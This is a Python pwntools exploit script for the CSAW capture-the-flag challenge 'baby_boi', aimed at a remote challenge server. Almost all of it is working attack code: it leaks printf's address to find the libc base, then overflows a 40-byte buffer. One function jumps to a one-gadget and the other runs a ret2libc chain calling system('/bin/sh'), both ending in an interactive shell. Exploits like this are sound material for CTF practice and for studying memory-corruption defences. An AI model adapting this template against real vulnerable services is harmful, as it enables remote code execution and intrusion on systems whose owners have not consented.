from pwn import *

def one_gadget():
    #p = process("./baby_boi")
    p = remote("pwn.chal.csaw.io", 1005)
    #libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so", checksec = False)
    libc = ELF("libc-2.27.so")
    p.recvuntil(": ")

    padding = 40
    pop_rdi = 0x0000000000400793
    printf = int(p.recv(), 16)
    log.info("Printf : 0x{0:x}".format(printf))
    base_libc = printf - libc.symbols['printf']
    log.info("Libc base : 0x{0:x}".format(base_libc))
    one_gadget_addr = base_libc + 0x4f2c5
    log.info("One gadget address : 0x{0:x}".format(one_gadget_addr))

    payload = 'A' * padding
    payload += p64(one_gadget_addr)

    #gdb.attach(p, '''
    #            b *main+167
    #            c
    #            ''')

    p.sendline(payload)
    p.interactive()

def ret2libc():
    #p = process("./baby_boi")
    p = remote("pwn.chal.csaw.io", 1005)
    #libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so", checksec = False)
    libc = ELF("libc-2.27.so", checksec = False)
    p.recvuntil(": ")

    padding = 40
    pop_rdi = 0x0000000000400793
    printf = int(p.recv(), 16)
    log.info("Printf : 0x{0:x}".format(printf))
    base_libc = printf - libc.symbols['printf']
    log.info("Libc base : 0x{0:x}".format(base_libc))
    system_libc = base_libc + libc.symbols["system"]
    log.info("Libc system : 0x{0:x}".format(system_libc))
    binsh_libc = base_libc + libc.search("/bin/sh").next()

    payload = 'A' * padding
    payload += p64(pop_rdi)
    payload += p64(binsh_libc)
    payload += p64(system_libc)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    one_gadget()